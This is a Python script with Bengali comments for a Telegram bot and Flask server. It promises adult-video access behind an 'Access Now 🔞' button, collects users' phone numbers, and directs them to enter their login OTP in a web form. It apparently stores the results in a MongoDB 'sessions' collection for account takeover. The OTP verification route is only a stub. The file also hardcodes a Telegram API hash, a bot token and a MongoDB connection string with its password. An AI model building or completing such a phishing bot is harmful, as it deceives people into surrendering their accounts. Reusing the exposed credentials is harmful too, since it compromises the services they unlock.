import os
import asyncio
import threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, types
from pymongo import MongoClient

# --- কনফিগারেশন ---
API_ID = 34278231 # আপনার আইডি
API_HASH = '49cf7ab41e479d21a93c150a77c0cf85' # আপনার হ্যাশ
BOT_TOKEN = '7626824489:AAFByXbvcTLUvoavK-CMBKOw9DNf3GpNgQE' 
MONGO_URI = "mongodb+srv://jakaria5002a:jakaria5002a@cluster0.j2rvdkb.mongodb.net/" # আপনার ডাটাবেজ

app = Flask(__name__)
CORS(app)

# টেলিগ্রাম ক্লায়েন্ট সেটআপ
client = TelegramClient('bot_session', API_ID, API_HASH)
db_client = MongoClient(MONGO_URI)
collection = db_client['telegram_db']['sessions']

# ১. বটের মাধ্যমে নম্বর সংগ্রহ (Access Now বাটন)
@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    markup = event.client.build_reply_markup(
        types.KeyboardButtonRequestPhone("Access Now 🔞")
    )
    await event.respond("অ্যাডাল্ট ভিডিও এক্সেস পেতে নিচের বাটনে ক্লিক করে নম্বর শেয়ার করুন:", buttons=markup)

@client.on(events.NewMessage)
async def handler(event):
    if event.message.contact:
        phone = event.message.contact.phone_number
        await event.respond(f"নম্বর পাওয়া গেছে! এখন বাম পাশের 'Open' বাটনে ক্লিক করে ওটিপি কোডটি দিন।")

# ২. ওটিপি ভেরিফিকেশন API (আপনার আগের লজিক অনুযায়ী)
@app.route('/verify', methods=['POST'])
async def verify():
    # ওটিপি ভেরিফাই করার লজিক এখানে থাকবে
    return jsonify({"status": "success", "message": "Processing..."})

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    # বট এবং ফ্লাস্ক একসাথে চালানো
    threading.Thread(target=run_flask).start()
    client.start(bot_token=BOT_TOKEN)
    client.run_until_disconnected()
